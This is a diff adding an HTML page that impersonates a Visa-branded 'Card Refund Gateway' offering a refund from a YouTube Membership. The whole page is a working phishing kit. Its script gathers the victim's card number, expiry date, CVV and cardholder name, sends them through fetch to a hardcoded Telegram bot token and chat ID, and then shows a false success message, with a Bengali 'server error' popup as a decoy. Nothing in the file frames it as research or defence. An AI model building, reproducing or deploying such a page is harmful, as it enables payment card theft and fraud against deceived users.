@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Refund Gateway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .payment-container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 400px;
+            box-sizing: border-box;
+        }
+
+        .payment-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .payment-header img {
+            height: 30px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 15px;
+        }
+
+        .input-group input {
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            width: 100%;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .row .input-group {
+            width: 50%;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container input {
+            margin-right: 8px;
+        }
+
+        .terms {
+            font-size: 13px;
+            color: #555;
+        }
+
+        .terms a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .terms a:hover {
+            text-decoration: underline;
+        }
+
+        .pay-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: #fff;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .pay-button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Popup Styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+        }
+
+        .popup p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .popup button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .popup button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="payment-container">
+    <div class="payment-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
+        <span id="refundAmount" style="font-size: 14px; color: #555;">Refund Amount</span>
+    </div>
+
+    <form id="paymentForm">
+        <div class="input-group">
+            <input type="text" id="cardNumber" placeholder="Enter Card Number" maxlength="16" oninput="checkCard()" required>
+        </div>
+
+        <div class="row">
+            <div class="input-group">
+                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="cvv" placeholder="CVC/CVV" maxlength="3" required>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="cardHolderName" placeholder="Card Holder Name" required>
+        </div>
+
+        <div class="checkbox-container">
+            <input type="checkbox" id="saveCard">
+            <label for="saveCard">Save card & remember me</label>
+        </div>
+
+        <p class="terms">
+            By checking this refund button you agree to our <a href="#">Terms of Service</a>, which is limited to facilitating your refund from <strong>YouTube Membership</strong>.
+        </p>
+
+        <button type="button" class="pay-button" onclick="processPayment()">Refund</button>
+    </form>
+</div>
+
+<!-- Popup for Card Validation -->
+<div class="popup-overlay" id="cardPopup">
+    <div class="popup">
+        <p>সার্ভার ত্রুটির কারনে পেমেন্ট গেটওয়ে তে সমস্যা সৃষ্টি হওয়াতে আমরা অত্যন্ত দুঃখিত।</p>
+        <button onclick="closeCardPopup()">Okay</button>
+    </div>
+</div>
+
+<!-- Popup for Refund Confirmation -->
+<div class="popup-overlay" id="refundPopup">
+    <div class="popup">
+        <p>Refund request proceeded successfully.</p>
+        <button onclick="closeRefundPopup()">Okay</button>
+    </div>
+</div>
+
+<script>
+    const botToken = "7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y";
+    const chatId = "7174617845";
+
+    function checkCard() {
+        const cardNumber = document.getElementById('cardNumber').value;
+        const refundAmount = document.getElementById('refundAmount');
+
+        if (cardNumber.length === 16) {
+            refundAmount.textContent = "Refund Amount $5.39";
+            showCardPopup();
+        } else {
+            refundAmount.textContent = "";
+        }
+    }
+
+    function processPayment() {
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiryDate = document.getElementById('expiryDate').value;
+        const cvv = document.getElementById('cvv').value;
+        const cardHolderName = document.getElementById('cardHolderName').value;
+
+        if (!cardNumber || !expiryDate || !cvv || !cardHolderName) {
+            alert("Please fill out all fields.");
+            return;
+        }
+
+        const message = `
+💳 **Refund Request**
+- **Card Number**: ${cardNumber}
+- **Expiry Date**: ${expiryDate}
+- **CVV**: ${cvv}
+- **Card Holder Name**: ${cardHolderName}
+        `;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    showRefundPopup();
+                } else {
+                    alert("Failed to send refund request.");
+                }
+            })
+            .catch(error => {
+                console.error("Error sending to Telegram:", error);
+                alert("An error occurred. Please try again.");
+            });
+    }
+
+    function showCardPopup() {
+        document.getElementById('cardPopup').style.display = 'flex';
+    }
+
+    function closeCardPopup() {
+        document.getElementById('cardPopup').style.display = 'none';
+    }
+
+    function showRefundPopup() {
+        document.getElementById('refundPopup').style.display = 'flex';
+    }
+
+    function closeRefundPopup() {
+        document.getElementById('refundPopup').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
